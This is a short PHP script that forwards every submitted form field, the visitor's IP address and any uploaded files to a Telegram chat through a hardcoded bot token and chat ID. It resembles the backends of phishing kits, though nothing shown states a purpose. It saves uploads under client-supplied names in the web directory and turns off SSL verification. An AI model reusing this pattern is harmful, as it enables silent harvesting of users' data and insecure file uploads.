<?php
// Telegram bot token
$tg_bot_token = "7179776264:AAF4NLjnS8NlDHepWazpdICpX1LI8W1WDBw";
// Chat ID
$chat_id = "-4143310941";

// Initialize the message text
$text = '';

// Append each POST parameter to the message text
foreach ($_POST as $key => $val) {
    $text .= $key . ": " . $val . "\n";
}

// Append client's IP address and current date-time to the message text
$text .= "\nIP Address: " . $_SERVER['REMOTE_ADDR'];
$text .= "\nDate: " . date('d.m.y H:i:s');

// Set up the parameters for the Telegram message
$param = [
    "chat_id" => $chat_id,
    "text" => $text
];

// Create the URL for the Telegram API request
$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

// Debug: Output the message text
var_dump($text);

// Send the message to the Telegram chat
file_get_contents($url);

// Process each uploaded file
foreach ($_FILES as $file) {
    // URL for sending documents
    $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendDocument";

    // Move the uploaded file to the current directory
    if (move_uploaded_file($file['tmp_name'], $file['name'])) {
        // Create a CURLFile object for the uploaded file
        $document = new \CURLFile($file['name']);

        // Initialize cURL session
        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            "chat_id" => $chat_id,
            "document" => $document
        ]);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

        // Execute the cURL request and close the session
        $out = curl_exec($ch);
        curl_close($ch);

        // Debug: Output the response from Telegram API
        var_dump($out);

        // Delete the uploaded file from the server
        unlink($file['name']);
    } else {
        // Handle error if the file could not be moved
        error_log("Failed to move uploaded file: " . $file['name']);
    }
}

// End the script with a success message
die('1');
